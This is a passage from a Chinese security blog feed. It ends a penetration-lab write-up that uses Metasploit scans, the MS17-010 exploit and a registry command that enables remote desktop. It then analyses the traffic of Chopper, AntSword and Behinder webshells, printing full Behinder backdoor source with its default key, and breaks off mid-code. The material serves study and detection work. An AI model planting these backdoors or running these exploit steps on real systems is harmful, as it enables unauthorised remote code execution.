auxiliary/scanner/portscan/tcp <br><span class="hljs-built_in">set</span> rhosts 192.168.52.141 192.168.52.138  <span class="hljs-comment">#可以对一整网段也行，具体的主机ip可以从上面的ping主机名获取</span><br><span class="hljs-built_in">set</span> ports 80,135-139,445,3306,3389<br>run<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737578.png" alt="image-20240518012512080"></p><p>可以先尝试一下永恒之蓝</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-built_in">set</span> rhosts 192.168.52.0/24<br><span class="hljs-built_in">set</span> threads 50<br>run<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737579.png" alt="image-20240518012240761"></p><p>然后尝试用永恒之蓝攻击拿shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">search ms17-010<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737580.png" alt="image-20240518014204665"></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use 0<br><span class="hljs-built_in">set</span> RHOSTS 192.168.52.138 <span class="hljs-comment">#192.168.52.141是32位的，这个模块只能打64位的机器</span><br>run<br></code></pre></td></tr></table></figure><p>额服了138也打不通很怪，一直报这个错误</p><p><img src="http://cdn.clown2024.cn/202407151737581.png" alt="image-20240518023451960"></p><p>但是用另一个只能执行一条命令模块能成功，所以还有另一种思路，就是先将三台主机的3389开启之后，先连上第一台Windows7的远程，再连另外两台</p><p>另一模块的使用如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use 2<br><span class="hljs-built_in">set</span> rhosts 192.168.52.138 <span class="hljs-comment">#目的地址</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f <span class="hljs-comment">#设置开启3389的命令</span><br>run<br></code></pre></td></tr></table></figure><p><strong>psexec打法</strong></p><p>emmm这个看别人视频打不通，用了frp也不行，视频链接：<a href="https://search.bilibili.com/all?vt=67228223&keyword=%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%80&from_source=webtop_search&spm_id_from=333.1007&search_source=3">红日靶场一-哔哩哔哩_bilibili</a></p><p>这里就懒了不试了（</p><p><strong>socks代理设置</strong></p><p>上面的路由只能msf访问，想要其他应用访问还要设置socks代理，参考这篇文章：<a href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> Proxies socks5:127.0.0.1:8989<br><span class="hljs-built_in">set</span> ReverseAllowProxy <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;靶场说明&quot;&gt;靶场说明&lt;/span&gt;&lt;/h1&gt;&lt;p&gt;虚拟机的统一密码：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs </summary>
      
    
    
    
    <category term="渗透靶场" scheme="https://clowsman.github.io/categories/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="渗透靶场" scheme="https://clowsman.github.io/tags/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>常见webshell流量分析</title>
    <link href="https://clowsman.github.io/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>https://clowsman.github.io/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2024-04-29T05:35:27.000Z</published>
    <updated>2024-07-15T06:50:24.006Z</updated>
    
    <content type="html"><![CDATA[<p>webshell常见的流量特征：</p><ol><li>网络通信模式：Webshell工具通常会与控制服务器进行通信，通过特定的网络协议传输数据。这些通信模式与正常的网络通信模式存在差异，如使用非标准端口、频繁的连接和断开等。</li><li>数据传输方式：Webshell工具可能使用加密或编码的方式传输数据，以隐藏其真实目的和内容。对于电子数据取证来说，需要解密或解码这些数据，以还原其原始内容。</li><li>文件操作行为：Webshell工具通常会对服务器上的文件进行读取、写入、删除等操作。这些文件操作行为可能涉及到敏感文件、系统文件或与被攻击的Web服务器相关的文件。通过分析这些文件操作行为，可以发现潜在的Webshell存在。</li><li>系统调用和命令执行：Webshell工具可能会利用系统调用和命令执行来执行一些恶意操作，如执行命令、修改系统配置等。通过监测和分析系统调用和命令执行的行为，可以发现Webshell的存在。</li></ol><p>这里学习参考文章：<a href="https://www.forensics-wiki.com/linux/webshell/">https://www.forensics-wiki.com/linux/webshell/</a></p><h1><span id="菜刀">菜刀</span></h1><p>中国菜刀 (Chopper) 是一款经典的网站连接工具支持的服务端脚本有 PHP、ASP、ASPX，具有文件管理数据库管理、虚拟终端等功能。</p><p>其流量特征较为明显，而且现在也比较少用，就拿一道buu上的题目来进行分析。</p><p>菜刀的流量特征：</p><ol><li><p>payload在请求体中，采用url编码+base64编码，payload部分是明文传输。</p></li><li><p>payload中有eval或assert、base64_decode这样的字符。</p></li><li><p>payload中有默认固定的&amp;z0&#x3D;QGluaV9zZXQ…这样base64加密的攻击载荷，参数z0对应$_POST[z0]接收到的数据，且固定为QGluaV9zZXQ开头。进行base64解码后可看到代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);这段意思是首先关闭报错和magic_quotes，接下来去获取主机的信息。<br></code></pre></td></tr></table></figure></li></ol><p><img src="http://cdn.clown2024.cn/202407151450073.png" alt="image-20240501191342304"></p><p>然后追踪一下tcp流去看一下请求和响应报文</p><p><img src="http://cdn.clown2024.cn/202407151450074.png" alt="image-20240501191930991"></p><p>可以看到明显的base64特征和eval函数等，action参数传递的就是payload，也符合上面的特征，&amp;action&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGl</p><p>我们可以去解码看一下这些payload</p><p><img src="http://cdn.clown2024.cn/202407151450075.png" alt="image-20240501192402117"></p><p>再根据下面的响应信息应该是执行了类似ls之类的操作</p><p>再去看看其他流有没有什么东西，在流7发现下面的东西</p><p><img src="http://cdn.clown2024.cn/202407151450076.png" alt="image-20240501200327032"></p><p>将z1解码看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">RDpcd2FtcDY0XHd3d1x1cGxvYWRcNjY2Ni5qcGc%3D<br><br>//解码<br>D:\wamp64\www\upload\6666.jpg<br></code></pre></td></tr></table></figure><p>应该是就是目录中的那张图片，前面的文件头也符合jpg的文件头</p><p>我们可以去将这个十六进制数据导出分组字节流</p><p><img src="http://cdn.clown2024.cn/202407151450077.png" alt="image-20240501202011704"></p><p>打开010导入Hex</p><p><img src="http://cdn.clown2024.cn/202407151450078.png" alt="image-20240501202722257"></p><p>然后再另存为1.jpg即可</p><p><img src="http://cdn.clown2024.cn/202407151450079.png" alt="image-20240501202801906"></p><p>在流9发现了下面的东西</p><p><img src="http://cdn.clown2024.cn/202407151450080.png" alt="image-20240501200405110"></p><p>将z1参数解码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">RDpcd2FtcDY0XHd3d1x1cGxvYWRcaGVsbG8uemlw<br><br>//解码<br>D:\wamp64\www\upload\hello.zip<br></code></pre></td></tr></table></figure><p>访问了一个需要密码的压缩包，可以用foremost直接提取出来</p><p><img src="http://cdn.clown2024.cn/202407151450081.png" alt="image-20240501201550429"></p><p>密码就是上面的图片，解压即可得到flag</p><h1><span id="蚁剑">蚁剑</span></h1><p>蚁剑的很多源码来自菜刀，所以链接流量特征与中国菜刀很相似，但是蚁剑的扩充性很好可以对进行加密，混淆等绕过处理。蚁剑默认支持 ASP以及PHP的Webshell链接，还可以通过插件来扩展其功能。</p><p>其流量特征如下：</p><ol><li><p>请求时可选择多种编码器，如果采用默认的方式，则仅进行url编码。</p></li><li><p>进行连接时会进行两次请求，第一次请求的payload和菜刀相似，也是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);<br></code></pre></td></tr></table></figure><p>意思是关闭报错和magic_quotes，接下来区获取主机信息。这段代码基本是所有WebShell客户端链接PHP类WebShell都有的一种代码。</p></li><li><p>第二次请求会把主机的目录列出来</p></li><li><p>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x…..&#x3D;”这种形式。</p><p>所以，以_0x开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征。</p></li></ol><p>这里本地去抓了看看，这里用的default的编码，即url编码</p><p><img src="http://cdn.clown2024.cn/202407151450082.png" alt="image-20240501230752754"></p><p>这是base64时的请求</p><p><img src="http://cdn.clown2024.cn/202407151450083.png" alt="image-20240501231413437"></p><p>再去看一下http请求的参数</p><p><img src="http://cdn.clown2024.cn/202407151450084.png" alt="image-20240501230857449"></p><p>emmm但是没有以0x开头，但是参数名字就会比较奇怪</p><h1><span id="冰蝎">冰蝎</span></h1><p>冰蝎是一款动态二进制加密 Web 远程管理客户端，以进行动态流量加密，且加密密钥是由使用者来设定，但是该拦截器对 webshell 的需求比较高，无法连接一句话木马。</p><p>所以该工具的目录下面都会配备已经写好的各种格式的shell，比如php、jsp等。</p><blockquote><p>这里一开始我的jdk17打不开冰蝎，去查了一下，可能是Java版本太高的原因，因为很多webshell工具的图形化都需要JavaFX库，但是从JAVA11之后这个库就被移除了，所以换一个低版本的java就好了。</p></blockquote><h2><span id="冰蝎10">冰蝎1.0</span></h2><p>可以看一下他的shell.php的内容，但是他原来的内容写的很简化也没有换行就很难看，我让ai给我格式化了一下加了个注释</p><p>原来的：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;;<span class="hljs-title function_ invoke__">session_start</span>();<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])?<span class="hljs-keyword">print</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())),<span class="hljs-number">16</span>):(<span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>), <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>])))&amp;@<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>后来的：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span> . <span class="hljs-string">&quot;&quot;</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// 检查是否存在 URL 参数 &#x27;pass&#x27;</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 如果存在 &#x27;pass&#x27; 参数，则设置一个会话变量 &#x27;k&#x27;</span><br>    <span class="hljs-comment">// &#x27;k&#x27; 是通过 md5 散列和 uniqid 随机生成的字符串的子串</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>] = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())), <span class="hljs-number">16</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果 &#x27;pass&#x27; 参数不存在，则执行以下操作</span><br>    <span class="hljs-comment">// 首先，使用会话变量 &#x27;k&#x27; 和 AES128 加密解密从 php://input 读取的内容</span><br>    <span class="hljs-comment">// &#x27;php://input&#x27; 用于获取通过 POST 请求发送的输入数据</span><br>    <span class="hljs-comment">// openssl_decrypt 用于解密数据，如果会话变量 &#x27;k&#x27; 不存在则可能产生错误</span><br>    <span class="hljs-comment">// 接着，使用 explode 函数以 &#x27;|&#x27; 字符分割解密后的数据</span><br>    <span class="hljs-comment">// 最后，尝试调用 C 类的 __invoke 方法，传入分割后数组的第二个元素</span><br>    <span class="hljs-comment">// 这可能导致任意代码执行，因为 __invoke 调用 eval</span><br>    <span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>), <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]));<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$b</span> !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(), <span class="hljs-string">&#x27;__invoke&#x27;</span>))) &#123;<br>        <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(), <span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>AES加密，对比冰蝎2.0少了base64的过程。</p><h2><span id="冰蝎20">冰蝎2.0</span></h2><ol><li>使用 AES加密+base64编码发起三次请求。</li><li>第一次GET请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的。第二次GET请求是为了获取密钥 key，服务端会生成16位的AES密钥。第三次使用 key 的AES加密进行通信，通信也采用了base64编码。</li><li>进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。因此当发现一个ip的请求头中的user-agent在频繁变换，就可能是冰蝎。</li></ol><p>shell.php，这里加上了注释</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 关闭错误报告，避免输出错误信息</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 开启会话</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-comment">// 检查 URL 参数 &#x27;pass&#x27; 是否存在</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pass&#x27;</span>])) &#123;<br>    <span class="hljs-comment">// 如果存在 &#x27;pass&#x27; 参数</span><br>    <span class="hljs-comment">// 生成一个随机的 MD5 散列值，并取其后 16 个字符作为密钥</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">uniqid</span>(<span class="hljs-title function_ invoke__">rand</span>())), <span class="hljs-number">16</span>);<br>    <span class="hljs-comment">// 将生成的密钥存储在会话变量 &#x27;k&#x27; 中</span><br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>] = <span class="hljs-variable">$key</span>;<br>    <span class="hljs-comment">// 输出密钥</span><br>    <span class="hljs-keyword">print</span> <span class="hljs-variable">$key</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果 &#x27;pass&#x27; 参数不存在</span><br>    <span class="hljs-comment">// 从会话变量 &#x27;k&#x27; 中获取密钥</span><br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>];<br>    <span class="hljs-comment">// 从 php://input 获取 POST 请求的数据</span><br>    <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>    <br>    <span class="hljs-comment">// 检查 openssl 扩展是否已加载</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>)) &#123;<br>        <span class="hljs-comment">// 如果 openssl 扩展未加载，使用基于 base64 和简单的异或操作的自定义加密/解密方法</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$post</span>);<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>); <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-comment">// 对每个字符进行异或操作</span><br>            <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] ^ <span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span> + <span class="hljs-number">1</span> &amp; <span class="hljs-number">15</span>];<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 如果 openssl 扩展已加载，使用 AES128 加密算法进行解密</span><br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">// 使用 &#x27;|&#x27; 字符将解密后的字符串分割为数组</span><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$post</span>);<br>    <span class="hljs-comment">// 获取数组的第一个元素作为要执行的函数名</span><br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-comment">// 获取数组的第二个元素作为函数参数</span><br>    <span class="hljs-variable">$params</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>    <br>    <span class="hljs-comment">// 定义一个类 C，其构造函数使用 eval 执行传入的参数</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span> . <span class="hljs-string">&quot;&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">// 实例化类 C，并传入参数 $params，这将执行 eval</span><br>    <span class="hljs-comment">// 这是非常危险的，因为它允许执行任意 PHP 代码</span><br>    @<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(<span class="hljs-variable">$params</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们去抓取流量包看一下特征</p><p>第一次访问绑定session</p><p><img src="http://cdn.clown2024.cn/202407151450085.png" alt="image-20240502005646958"></p><p>第二次访问获取key</p><p><img src="http://cdn.clown2024.cn/202407151450086.png" alt="image-20240502010016480"></p><p>第三次开始利用session中的key进行加密通信</p><p><img src="http://cdn.clown2024.cn/202407151450087.png" alt="image-20240502010147065"></p><blockquote><p>至于UA头的替换这里暂时还没有发现</p></blockquote><p>更具体地分析可以参考这篇文章：<a href="https://zhuanlan.zhihu.com/p/571463343">https://zhuanlan.zhihu.com/p/571463343</a></p><h2><span id="冰蝎30">冰蝎3.0</span></h2><ol><li>使用AES加密+base64编码发起两次请求。</li><li>冰蝎3.0取消了动态密钥获取的请求，AES的密钥直接固定为连接密码32位md5的前16位，默认连接密码是”rebeyond”(即密钥是md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)。服务端和客户端不再进行密钥的交互传递。两次请求中，第一次请求用于判断是否可以建立连接。第二次发送 phpinfo 等代码执行，获取网站的信息。</li><li>其可能作为识别特征的是:Content-Type:application&#x2F;octet-stream。application&#x2F;octet-stream 为 http 规范中较少使用的一种 Content-Type，其含义为只能提交二进制，而且只能提交一个二进制，如果提交文件的话，只能提交一个文件 ，后台接收参数只能有一个，而且只能是流 (或者字节数组)。</li></ol><p>shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>抓流量包看一下，这里要AES解码才能看出来，找个在线网站即可</p><p>第一次请求，可以看到直接发送POST请求，没有get了</p><p><img src="http://cdn.clown2024.cn/202407151450088.png" alt="image-20240502011823055"></p><h2><span id="冰蝎40">冰蝎4.0</span></h2><ol><li>提供了传输协议自定义的功能，让用户对流量的加密和解密进行自定义，实现流量加解密协议的去中心化。v4.0版本不再有连接密码的概念，自定义传输协议的算法就是连接密码。</li><li>Accept字段（弱特征），通常是Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01 意思是浏览器可接受任何文件，但最倾向application&#x2F;json 和 text&#x2F;javascript。</li><li>Content-Type字段（弱特征），通常是Content-type: Application&#x2F;x-www-form-urlencoded</li><li>与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</li><li>连接的端口有一定的特征，冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。</li><li>使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive</li><li>有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</li><li>默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥，与冰蝎3.0相同。</li></ol><p><img src="http://cdn.clown2024.cn/202407151450089.png" alt="image-20240502020936014"></p><blockquote><p>不过他可以兼容3.0使用密码的方式连接，默认连接密码和3.0是一样的，主要是看看他的其他的传输协议</p></blockquote><p>shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;e45e329feb5d925b&quot;</span>; <span class="hljs-comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br><span class="hljs-title function_ invoke__">session_write_close</span>();<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>&#123;<br><span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br><span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>     <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span 